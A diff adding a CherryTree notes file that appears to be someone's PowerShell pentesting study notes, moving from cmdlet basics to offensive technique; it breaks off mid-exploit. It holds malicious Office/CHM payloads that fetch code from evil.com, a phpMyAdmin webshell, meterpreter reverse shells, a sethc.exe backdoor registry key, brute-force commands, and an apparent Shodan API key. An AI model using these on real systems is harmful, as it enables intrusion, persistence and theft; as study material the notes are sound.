@@ -1,0 +1,988 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="True" name="Powershell Concepts" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591384497.54" ts_lastsave="1594086781.04" unique_id="1">
+		<rich_text>
+</rich_text>
+		<rich_text foreground="#ffffa5a50000" weight="heavy">Powershell Basic commands:</rich_text>
+		<rich_text>
+
+• Get-Command -CommandType cmdlet |more
+• Get-Help Get-command -Parameter * |more   //Update-help//
+• Get-Command -Name *process*
+• Start-Process notepad.exe
+• Get-Process -Name notepad 
+• Get-Process | Measure-Object
+• Stop-Process -Id 1234
+• Select-Object -ExpandProperty
+
+• Get-hotfix -→ security Patches
+• Get-Help *command* -examples 
+• Get-ChildItem --→ ls command 
+• Get-ChildItem | Format-Table Name -→ outputs the Name column only //alias ft //
+• Get-ChildItem | Format-List → details about the output 
+• Get-Process | Out-Gridview
+• Get-Help Out-File -Examples | more
+• Get-ChildItem | Out-file -Filepath C:\Windows\file.txt           \\Get-Content  -Path C:\Windows\file.txt
+• Get-Location
+
+</rich_text>
+		<rich_text foreground="#ffffa5a50000" weight="heavy">VARIABLES|FUNCTIONS|ARRAYS|LOOPS</rich_text>
+		<rich_text>
+
+• Variables: $a , $b 
+• Operators:  -replace , -in , -ne , -eq , -le, -ge, -gt, -lt, -match, -join eg: “wel” , “in” -join “come” , -split , -is , -as , -and , -or etc
+• Types : $a=&quot;sahil&quot; $a.GetType()
+• Here String: @&quot; Hello World &quot;@
+• Type Casting/Conversion: $a=2+3.33    [int] $a returns 5 
+• Array: $array=1,2,3,4   $array.length , $array[0] etc  / empty array $emptyarray=@() /
+• Loops: For , foreach , While  /Loop-cmdlet: ForEach-Object , Where-Object /
+• Get-Process | ForEach-Object {$_.Name}  // similar to Get-Process |ft Name //
+• Get-ChildItem | Where-Object {$_.Name -match &quot;ss.txt&quot;}
+
+
+Function:
+
+function add($a,$b) {
+
+$a+$b
+
+}
+
+// You can Directly call function without parenthesis like : add 1 2 //
+
+SWITCH:
+
+function add($a,$b,[switch]$file) {
+
+if($file) { $a-$b }→  it puts a value in b and b value in a 
+
+$a+$b
+
+}
+
+</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Scripting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591760741.63" ts_lastsave="1593520538.52" unique_id="2">
+			<rich_text>
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">SCRIPTING|MODULES|MANIFEST</rich_text>
+			<rich_text>
+
+• For running .ps1 scripts do → Set-ExecutionPolicy Bypass
+• advance cmdlets→ Write-Output , Remove-Item , Write-Verbose, Test-Path,Read-Host
+• dot-sourcing: . . \script.ps1
+• eg:
+function display 
+    {
+
+        param (
+        [Parameter(Mandatory= $True, ValuefromPipeline= $True)]
+        $a,
+
+        $b
+
+        )
+
+        Write-Output &quot;$a is nice&quot;
+        Write-Output &quot;$b is verynice&quot;
+    }
+    
+Run the above function → . . /script.ps1 → display -a 1 -b 2 → output 
+
+Use $Global:a → to use variable a across multiple functions 
+$a=Read-Host //to take input from commandline //
+
+• [Parameter] attributes → mandatory , valuefrompipeline, position , allownull etc
+• [cmdletbinding (supportsShouldprocess=$True) ] before param () section , this allows us to use -confirm , -whatif , -Verbose(works directly also)
+• Get-Help Get-Module 
+• Get-Module // Lists all the modules in current powershell session //
+• Get-Module -ListAvailable -All //gives all the modules on the system//
+• $env:PSModulePath  → gives modules path
+• Import-Module C:\test.psm1
+• Import-Module C:\test.psm1 -Verbose //lists all the functions while loading //
+• Remove-Module test
+• There can be multiple functions in the module : Import-Module C:\test.psm1 ; Get-Command -Module test → gives multiple functions within the module
+• Export-ModuleMember -Function *-* → verbose output showing functions only with this *-* naming convention
+• New-ModuleManifest .\test.psd1 → creates an info file for test.psm1 module 
+
+
+To list all the functions in a powershell script convert .ps1 to .psm1 and then run 
+Get-Command -Module _modulename_
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Remoting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592008887.23" ts_lastsave="1593947966.41" unique_id="3">
+			<rich_text>
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">REMOTING</rich_text>
+			<rich_text foreground="#ffffa5a50000">
+</rich_text>
+			<rich_text>
+• Get-Command -CommandType cmdlet -ParameterName Computername
+• Get-Command -CommandType cmdlet| Where-Object {$_.Parameters.Keys -contains 'Computername'}  // -match also works instead of -contains //
+• Get-hotfix -ComputerName PRVDXB113 -Credential provise\sahil.tikoo
+• foreach ($pc in ('localhost','sahil.tikoo','google.com')) { test-connection $pc }  // works as ping command //
+• Remoting → WSMAN portocol | WinRM framework , works on ports 5985,5986
+
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">WinRM|WSMan</rich_text>
+			<rich_text>
+
+• Set-Item WSMan:\localhost\client\trustedhosts -Value *  → Need to set it on attacker's machine if its not in the domain
+• Get-Item WSMan:\localhost\client\trustedhosts
+
+• Invoke-Command -ScriptBlock {$env:Computer-Name} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo
+• Invoke-Command -ScriptBlock {Get-Process} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo
+• Get-Help New-PSSession
+• New-PSSsession -ComputerName  PRVDXB113 -Credential provise\sahil.tikoo → creates new session with remote machine
+• Get-PSSession 
+• $PSVersionTable → Get powershell version for current session
+• Enter-PSSsession -Id 1 → now enter any commands on remote machine just like after ssh 
+• Enable-PSremoting -Force → on remote victim machine if windows server less than 2012 
+• Invoke-Command -ScriptBlock -Filepath C:\test.ps1 -ComputerName PRVDXB113 -Credential provise\sahil.tikoo
+• Import-Module .\test.psm1 ;Invoke-Command -ScriptBlock ${function:Function-name} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo → To execute functions in module on remote machine
+• Invoke-Command works stateless , so to maintain a link between multiple Invoke commands , first do New-PSSession then specify -Session $sess=Get-PSSession 
+• Export-PSSession → to export all the functions and scripts ran on remote machine
+
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Double Hop Problem </rich_text>
+			<rich_text>
+
+Target1-&gt; attacker's machine Target2-&gt; Remote machine Target3-&gt; Domain controller
+
+If u are trying to access data in Target3 from Target1 then you need to first use New-PSSession to hop onto target2 from target1 and then use the command : Enable-WSManCredSSP  -Role Server 
+
+Now you can access lets say DC using ls \\DC\sysvol through target3 if u were a domain admin.
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Jobs</rich_text>
+			<rich_text>
+
+
+• Start-Job -Scriptblock {hostname}  → assigned ID 5 
+• Get-job -Id 5
+• Get-job -Id 5 |Receive-Job → output of Job 
+• If executing jobs on remote machine using Invoke-Command make sure to use -Session $sess ; where $sess=Get-PSSession 
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name=".NET" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592093823.7" ts_lastsave="1592693266.64" unique_id="4">
+			<rich_text>
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">.NET</rich_text>
+			<rich_text>
+
+</rich_text>
+			<rich_text weight="heavy">Assemblies|Classes|methods</rich_text>
+			<rich_text>
+
+</rich_text>
+			<rich_text foreground="#ffff00000000">Note:</rich_text>
+			<rich_text foreground="#ffff00000000" weight="heavy">Static method</rich_text>
+			<rich_text foreground="#ffff00000000">(s) are associated to the </rich_text>
+			<rich_text foreground="#ffff00000000" weight="heavy">class</rich_text>
+			<rich_text foreground="#ffff00000000"> in which they reside i.e. they can be called even without creating an instance of the </rich_text>
+			<rich_text foreground="#ffff00000000" weight="heavy">class</rich_text>
+			<rich_text foreground="#ffff00000000"> i.e ClassName. methodName(args).</rich_text>
+			<rich_text>
+
+• [AppDomain]::CurrentDomain.GetAssemblies() → get all dll's and exe
+• [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {$_.GetTypes()}| Where-Object {$_.IsPublic -eq &quot;True“} → gets all available classes
+• $classes=[AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {$_.GetTypes()}| Where-Object {$_.IsPublic -eq &quot;True“}
+• $proclass= $classes | where-object { $_.Name -eq “Process”} → lists process class
+• $proclass | Get-Member |more
+• $proclass | Get-Member -MemberType Method -Static --&gt;get methods in process class
+• $proclass::GetProcesses() → a way to run methods available in classess using objects
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Add-Type</rich_text>
+			<rich_text> [ -Path , -TypeDefinition, -AssemblyName , -PassThru]
+
+• Add-Type -AssemblyName System.Windows.Forms --&gt;add assembly in current powershell session
+•  [System.Windows.Forms.Sendkeys]|Get-Member -MemberType Method -Static // list all the members or methods//
+• [System.Windows.Forms.Sendkeys]::SendWait(&quot;helllo&quot;)  // As SendWait is static method hence it is called directly without creating an object //
+• [System.ServiceProcess.ServiceController]::GetDevices // before this use Add-Type //
+• For calling non-static methods we need to create object → $obj= New-Object class_name ; $obj.method_name()
+
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name=".NET Powershell script " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592452660.64" ts_lastsave="1594090771.87" unique_id="5">
+				<rich_text>
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">Code:</rich_text>
+				<rich_text>
+
+
+$DotnetCode = @&quot;
+public class SysCommands
+{
+    public static void lookup (string domainname)
+    {
+	    string ns = &quot;/k nslookup.exe &quot; + domainname;
+        System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,ns);
+    }
+
+    public void netcmd (string cmd)
+    {
+        string cmdstring = &quot;/k net.exe &quot; + cmd;
+        System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,cmdstring);
+
+    }
+
+    public static void Main()
+    {
+        string cmdstring = &quot;/k net.exe &quot; + &quot;user&quot;;
+        System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,cmdstring);
+    }
+}
+
+&quot;@
+
+#Add-Type -TypeDefinition $DotnetCode -OutputType Library -OutputAssembly C:\PFPT\SysCommands.dll
+#Add-Type -TypeDefinition $DotnetCode -OutputType ConsoleApplication -OutputAssembly C:\PFPT\SysCommand.exe
+
+#[SysCommands]::lookup(&quot;google.com&quot;)
+
+$obj = New-Object SysCommands
+$obj.netcmd(&quot;user&quot;)
+
+
+
+• We can create exe and dll's from .NET code in poweshell scripts by using -OutputType and -OutputAssembly 
+• $Obj=Add-Type -Path &quot;C:\PFPT\SysCommands.dll -PassThru --→ create an object for the class in dll file → -PassThru is used to load all the methods 
+
+
+• Site for fetching windows API calls(Like creating symlinks in system): pinvoke.net
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">Code from pinvoke.net to create a symlink :</rich_text>
+				<rich_text>
+
+$signature= @&quot; 
+
+[DllImport(&quot;Kernel32.dll&quot;, SetLastError = true, CharSet = CharSet.Unicode)]
+[return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.I1)]
+static extern bool CreateSymbolicLink(string lpSymlinkFileName, string lpTargetFileName, int dwFlags);
+
+&quot;@
+
+$Symlink= Add-Type -MemberDefinition $signature -Name symlink -Namespace createlink -PassThru 
+
+ $Symlink::CreateSymbolicLink('C:\test\link','C:\Users', 1)
+ 
+ save it as  a powershell script and run 
+ 
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="WMI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592596234.71" ts_lastsave="1592728021.21" unique_id="6">
+			<rich_text>
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">WMI</rich_text>
+			<rich_text>
+
+• Assesmblies are files containing classes : dll , exe . eg:- system.diagnostics.process.dll 
+• But Namespace are just names , eg: system is a namespace covering all the classes.
+• Get-WmiObject  -Namespace &quot;root&quot; -Class  “__Namespace”  // Get all the namespaces under root //
+• Get-WmiObject  -Namespace &quot;root/cimv2&quot; -List // Get all classess 
+• Get-WmiObject  -Namespace &quot;root/cimv2&quot; -List | Where-Object {$_.Name -match &quot;Win32&quot;} // Get all Win32 classes
+• Get-WmiObject  -Class Win32_process  -List | Select-Object -ExpandProperty Methods // Lists all the methods in Win32_process class //
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">WMI REMOTING </rich_text>
+			<rich_text>
+
+Advantage of using wmi is that we don't need powershell remoting to be enabled on remote machine 
+
+• Get-WmiObject  -Class Win32_process -ComputerName PRVDXB113 -Credential provise\sahil.tikoo // similar to  Invoke-Command -ScriptBlock {Get-Process} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo // 
+• Attributes in Wmi-Object cmdlet : -filter (Name= “ name_of_process”) , -Query (Select * from Win32_process where Name = “name_of_process”)
+• Remove-WmiObject → to stop the Wmi action passed to it 
+• Invoke-WmiMethod -Class Win32_process -Name Create -ArgumentList “notepad.exe”
+• Invoke-WmiMethod -Class Win32_process -Name Create -ArgumentList “notepad.exe” -ComputerName PRVDXB113 -Credential provise\sahil.tikoo // running methods on remote machine //
+• Get-WmiObject  -Class Win32_process -filter (Name=&quot;notepad.exe&quot;) -ComputerName PRVDXB113 -Credential provise\sahil.tikoo  // to check if notepad has started on remote machine 
+
+  
+ 
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="COM objects" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592728021.21" ts_lastsave="1592869191.39" unique_id="7">
+			<rich_text>
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Overview:</rich_text>
+			<rich_text>
+
+COM stands for Microsoft’s Component Object Model which is a platform standard that is designed to allow applications to reuse code between multiple applications, hosts, and platforms. PowerShell can use these COM’s to manipulate applications and perform specific tasks that would otherwise be impossible due to lack of cmdlets.
+
+• Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -include PROGID -recurse | foreach {$_.GetValue(&quot;&quot;)} | Where-Object {$_ -match “wscript&quot;}  // to load all the  wscript COM objects //
+• $wscript= New-Object -COMObject WScript.Shell.1  //create a object with a reference to wscript COM object to interact with the available methods //
+• $wscript | Get-Member -MemberType methods // list methods → $wscript.popup(&quot;helllo&quot;)  //
+• COM objects can also be used to embed our macros in excel,word etc
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Creating IE COM object to run a website:</rich_text>
+			<rich_text>
+
+• $wscript= New-Object -COMObject InternetExplorer.application
+• $wscript | Get-Member -MemberType methods
+• $wscript.Navigate(&quot;</rich_text>
+			<rich_text link="webs https://www.google.com&quot;)">https://www.google.com&quot;)</rich_text>
+			<rich_text>
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Registry" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592869191.39" ts_lastsave="1593167190.02" unique_id="8">
+			<rich_text>
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Registry</rich_text>
+			<rich_text>
+
+#Registry editor can be used to view registry content.Registry is a database for windows.
+
+• Get-PSProvider -PSProvider Registry 
+• Get-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'  //Get version details from registry hives using keys//
+• Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
+• Set-Location Registry:: ; ls  → lists all the registry hives
+• Get-PSDrive 
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Create folder and data in Registry </rich_text>
+			<rich_text>
+
+
+• New-Item -Path HKCU:\PFPT
+• New-ItemProperty -Path HKCU:\PFPT -Name test -PropertyType String -Value 2
+• New-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' -Name cmd -PropertyType String -Value cmd.exe // press shift 5 times will execute cmd with admin privileges //
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Registry on remote machine</rich_text>
+			<rich_text>
+
+• Using Enter-PSSession // interactive shell on remote machine //
+• Invoke-Command -Scriptblock {Get-Item HKCU:\software} -ComputerName sahil -Credential
+• $reg=Get-WmiObject -Class “StdRegProv” -List  -ComputerName PRVDXB113 -Credential provise\sahil.tikoo; $reg | Select-Object -ExpandProperty methods
+• $reg.GetStringValue(2147483650,&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot;,&quot;ProductName&quot;) // use </rich_text>
+			<rich_text link="webs https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1">https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1</rich_text>
+			<rich_text> to get the registry numeric values // 
+• </rich_text>
+			<rich_text link="webs https://archive.codeplex.com/?p=psremoteregistry">https://archive.codeplex.com/?p=psremoteregistry</rich_text>
+			<rich_text> → Registry module </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Powershell Toolkit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593167190.02" ts_lastsave="1593262265.44" unique_id="9">
+			<rich_text>
+
+Tools:
+
+• Nishang  </rich_text>
+			<rich_text link="webs https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</rich_text>
+			<rich_text> 
+ 
+• PowerSploit  </rich_text>
+			<rich_text link="webs https://github.com/mattifestation/PowerSploit">https://github.com/mattifestation/PowerSploit</rich_text>
+			<rich_text> 
+ 
+• PowerTools  </rich_text>
+			<rich_text link="webs https://github.com/Veil-Framework/PowerTools">https://github.com/Veil-Framework/PowerTools</rich_text>
+			<rich_text> 
+ 
+• Posh-SecMod  </rich_text>
+			<rich_text link="webs https://github.com/darkoperator/Posh-SecMod/">https://github.com/darkoperator/Posh-SecMod/</rich_text>
+			<rich_text>
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Pentesting Methodology " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593262265.44" ts_lastsave="1594065638.2" unique_id="12">
+			<rich_text>
+
+• Recon
+• Scanning
+• Exploitation
+• Post exploitation 
+• persistance 
+• Exfiltration
+• Reporting</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="True" name="Recon and Scanning " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593262283.69" ts_lastsave="1593272706.6" unique_id="13">
+				<rich_text>
+
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">Port-scan and Recon:</rich_text>
+				<rich_text>
+
+•   In Nishang , poshsec-mod and powersploit there is a port scan powershell script 
+•   . .\Invoke-PortScan.ps1  --&gt;after loading script in memory run → Invoke-PortScan -Hosts google.con -PingOnly 
+• Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost // FOR portscan //
+• Invoke-ARPScan -CIDR 192.168.254.0/24 // in posh-secMod gtihub→  Import-Module .\Posh-SecMod.psd1(its a manifest file)//
+• Invoke-EnumSRVRecords -Domain google.com // in posh-secMod gtihub  → Import-Module .\Posh-SecMod.psd1 //
+
+
+• Posh-Shodan : </rich_text>
+				<rich_text link="webs https://github.com/darkoperator/Posh-Shodan">https://github.com/darkoperator/Posh-Shodan</rich_text>
+				<rich_text> // powershell module to interact with shodan API's //
+• Set-ShodanAPIKey -APIKey 238784665352425277288393 -MasterPassword (Read-Host -AsSecureString) 
+• . .\Powersploit\Recon\Get-HttpStatus.ps1 //Get-HttpStatus -Target google.com -Path .\Powersploit\Recon\Dictionaries\generic.txt
+
+
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">Nmap with powershell </rich_text>
+				<rich_text>
+
+ $outputpath = &quot;C:\&quot;
+$IPRanges = @(&quot;192.168.254.0/24&quot;, &quot;192.168.1.0/24&quot;)
+foreach ($range in $IPRanges)
+{
+    $temp = $range -split &quot;/&quot;
+    $file = $temp[0]
+    &amp; &quot;nmap.exe&quot; &quot;-sV&quot; &quot;-Pn&quot; &quot;-sT&quot; &quot;-p-&quot; &quot;-T4&quot; &quot;$range&quot; &quot;-oA&quot; &quot;$Outputpath\$file&quot;
+}
+
+
+Note:You can start any program inside powershell with &amp; 
+
+
+• Parsing Nmap : .\Parse_Nmap -Path .\filename.xml
+
+Reads:
+
+• </rich_text>
+				<rich_text link="webs https://github.com/hardwaterhacker/scandiff">https://github.com/hardwaterhacker/scandiff</rich_text>
+				<rich_text> // automating nmap with powershell //
+• </rich_text>
+				<rich_text link="webs https://www.darkoperator.com/blog/2013/4/15/using-posh-secmod-to-automate-nessus-part1.html">https://www.darkoperator.com/blog/2013/4/15/using-posh-secmod-to-automate-nessus-part1.html</rich_text>
+				<rich_text> //automating nessus parsing part-1 //
+• </rich_text>
+				<rich_text link="webs https://www.darkoperator.com/blog/2013/4/16/using-posh-secmod-powershell-module-to-automate-nessus-part.html">https://www.darkoperator.com/blog/2013/4/16/using-posh-secmod-powershell-module-to-automate-nessus-part.html</rich_text>
+				<rich_text> //automating nessus parsing part-2 //
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="True" name="Brute-Force" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593262376.16" ts_lastsave="1593272653.02" unique_id="14">
+				<rich_text>
+
+
+• Enter-PSSession -Session $sess
+• In Nishang : . .\Brute-Force [install ps1 script on remote machine]
+• Brute-Force -Identity Sahil -UserName Administrator -Password Password1 -Service ActiveDirectory
+• cat ./passwords.txt | Brute-Force -Identity Sahil -UserName Administrator -Service ActiveDirectory
+• Brute-Force -Identity Sahil -UserName Administrator -Password Password1 -Service SQL
+
+
+
+• WinRM : Get-WinRMPassword -ComputerName sahil -username provise\sahil.tikoo -wordlist ..\password.txt //Get-WinRMPassword.ps1 in nishang//
+• Wmi : Get-WMIPassword -ComputerName sahil -username provise\sahil.tikoo -wordlist ..\password.txt //Get-WMIPassword.ps1 in nishang//
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="True" name="ExecuteMSSQL commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593272698.29" ts_lastsave="1593274219.39" unique_id="15">
+				<rich_text>
+
+
+In Nishang: Execute-Command-MSSQL.ps1
+
+• Execute-Command-MSSQL  -ComputerName sahil -UserName sa -Password 123 // xp_cmdshell is not enabled by default // 
+• Select Type of Shell
+
+
+• If You do not have the username and password for remote MSSQL then use Execute-Command-MSSQL  -ComputerName sahil -WindowsAuthentication    
+
+
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="True" name="Client Side attacks " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593274193.2" ts_lastsave="1594066099.21" unique_id="16">
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">Malicious Excel: </rich_text>
+				<rich_text>
+
+• Nishang
+• Out-Word , Out-Excel
+• . .\nishang\Client\Out-Excel.ps1 
+• Out-Excel -Payload “powershell.exe -noexit -c Get-Service ” → this commandlet generates an excel with the macro by using the payload 
+• Get-Help Out-Excel -Full
+• Out-Excel -PayloadURL  </rich_text>
+				<rich_text link="webs https://evil.com/attack.ps1">https://evil.com/attack.ps1</rich_text>
+				<rich_text>   -ExcelFileDir ..\C:\excelfolder // -ExcelFileDir makes the existing excel files into malicious one's //
+• Out-CHM -Payload “-c Get-Process ” -HHCPath ‘C:\Program Files (x86)\HTML Help Workshop’ → It creates an html help file 
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">Generate an HTML help file with encoded reverse shell payload :</rich_text>
+				<rich_text>
+
+• . .\nishang\Utility\Invoke-Encode.ps1
+• Invoke-Encode -DataToEncode .\reverse_powershell.ps1 -OutCommand //generates encodedcommand.txt file containing the encoded payload //
+• Out-CHM -Payload “-e *paste data from above txt file here* ” -HHCPath ‘C:\Program Files (x86)\HTML Help Workshop’  //open the created compiled file and you get a reverse shell //
+• Out-Shortcut -PayloadURL </rich_text>
+				<rich_text link="webs https://evil.com/attack.ps1">https://evil.com/attack.ps1</rich_text>
+				<rich_text>  //Creates a shortcut file based on the payload in ps1 script //
+
+• Out-HTA is similar to Out-CHM but instead generates an html file 
+• Out-Java generates a java file 
+
+All the exploits like reverse_shell are run without elevated privileges.
+
+• Out-Excel -Payload “powershell.exe Start-Process -FilePath powershell.exe -ArgumentList ‘’-c IEX((New-Object Net.webclient).DownloadString(''''https://evil.com/attack.ps1''''));Get-attack'' -Verb runas&quot; → to run with elevated privileges 
+
+
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="True" name="PhpMyAdmin " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593327416.65" ts_lastsave="1593394871.99" unique_id="17">
+				<rich_text>
+
+We assume we have access to the phpMyAdmin portal 
+
+Run below SQL Query to find the windows version:
+
+• SHOW VARIABLES LIKE  &quot;%version%&quot;; //whether x64 or x86
+• Create Webshell: 
+• SELECT ‘&lt;?php echo shell_exec($_GET['cmd']); ?&gt;’ INTO OUTFILE 'C:\\inetpub\\wwwroot\\phpmyadmin\\config\\shell.php' //assuming web server to be IIS//
+• </rich_text>
+				<rich_text link="webs http://newpc/phpmyadmin/config/shell.">http://newpc/phpmyadmin/config/shell.</rich_text>
+				<rich_text>php?cmd=C:\Windows\Syswow64\Windowspowershell\v1.0\powershell.exe -c iex((New-Object Net.WebClient).DownloadString('http:/ /192.168.254.1/Invoke-ShellCode.ps1'));Invoke-ShellCode -Payload windows/meterpreter/reverse_https -LHost 192.168.254.226 -Lport 8443 -Force //invoke-Shellcode is a script from powersploit //
+
+Insert malicious SQLMAP UDF(user defined functions)DLL in the web server for code execution instead of reverse shell // admin privileges are required for this //
+
+• SELECT @@plugin_dir → shows the directory where you need to upload DLL
+• Convert-Dll –DllPath .\lib_mysqludf_sys.dll –OutputPath C:\test\dll.txt // Get the DLL from here → </rich_text>
+				<rich_text link="webs https://github.com/rootphantomer/hack_tools_for_me/tree/master/sqlmap%20lib_mysqludf_sys">https://github.com/rootphantomer/hack_tools_for_me/tree/master/sqlmap%20lib_mysqludf_sys</rich_text>
+				<rich_text> //
+• Write converted DLL to server plugin directory → SELECT CHAR(77,90,144…) INTO OUTFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.6\\lib\\plugin\\lib_mysqludf_ sys.dll' FIELDS ESCAPED BY '‘ 
+• CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll' // Create UDF //
+• Execute commands → Select sys_eval(‘whoami’) 
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="True" name="Metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593336701.76" ts_lastsave="1593396298.49" unique_id="18">
+				<rich_text>
+
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">MsfVenom: </rich_text>
+				<rich_text>
+
+• ./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;IP&gt; -f psh &gt; ps_file.ps1
+• -f --&gt; psh-reflection //the above ps1 code usually has to be written in a directory and compiled due to the c# code , but psh-reflection generates a payload which can be directly executed in memory using iex//
+• cmd/windows/reverse_powershell  → -p payload 
+• use the ps1 scripts in the server with RCE on it like: 
+• </rich_text>
+				<rich_text link="webs http://newpc/phpmyadmin/config/shell.">http://newpc/phpmyadmin/config/shell.</rich_text>
+				<rich_text>php?cmd=C:\Windows\System32\Windowspowershell\v1.0\powershell.exe -c iex((New-Object Net.WebClient).DownloadString('http:/ /192.168.254.1/ps_file.ps1'))
+• exploit/windows/smb/psexec_psh // powershell exploits in metasploit 
+
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">Executing Powershell scripts on the remote machine through metasploit </rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ffff00000000">1st method:</rich_text>
+				<rich_text>
+You can upload scripts(ps1) like Get-Information.ps1 from nishang in /opt/metasploit directory and execute it on the remote machine 
+
+• upload /opt/metasploit/Get-Information.ps1 C:/[path of the machine on which you have shell → pwd ]
+• shell
+• C:\Windows\system32\Windowspowershell\v1.0\powershell.exe -ep bypass . .\Get-Information.ps1;Get-Information
+
+</rich_text>
+				<rich_text foreground="#ffff00000000">2nd method:</rich_text>
+				<rich_text>
+• Having a shell on remote machine attacker can also run : C:\Windows\system32\Windowspowershell\v1.0\powershell.exe -c IEX((New-Object Net.webclient).DownloadString('https://evil.com/attack.ps1'));Get-attack
+
+</rich_text>
+				<rich_text foreground="#ffff00000000">3rd method:</rich_text>
+				<rich_text>
+• We can execute encoded powershell script directly on remote machine without having to upload the powershell script in the remote machine.
+• We can also use Invoke-Encode -DataToEncode .\reverse_powershell.ps1 -OutCommand 
+•  C:\Windows\system32\Windowspowershell\v1.0\powershell.exe -e *paste the encoded ps1 script here* // make sure the function is called within the script itself as we can't call the function here like ;function-name //</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="True" name="Porting Exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593396411.69" ts_lastsave="1593408960.28" unique_id="19">
+				<rich_text>
+
+
+</rich_text>
+				<rich_text foreground="#ffff00000000">Netcat:The powershell Version → powercat [</rich_text>
+				<rich_text foreground="#ffff00000000" link="webs https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</rich_text>
+				<rich_text foreground="#ffff00000000">]</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">PhpMoAdmin Exploit:</rich_text>
+				<rich_text>
+
+The below exploit is created using Msxml2.XMLHTTP COM Object 
+
+Exploit:</rich_text>
+				<rich_text link="webs https://www.exploit-db.com/exploits/36251">https://www.exploit-db.com/exploits/36251</rich_text>
+				<rich_text>
+
+$cmd = &quot;&quot;
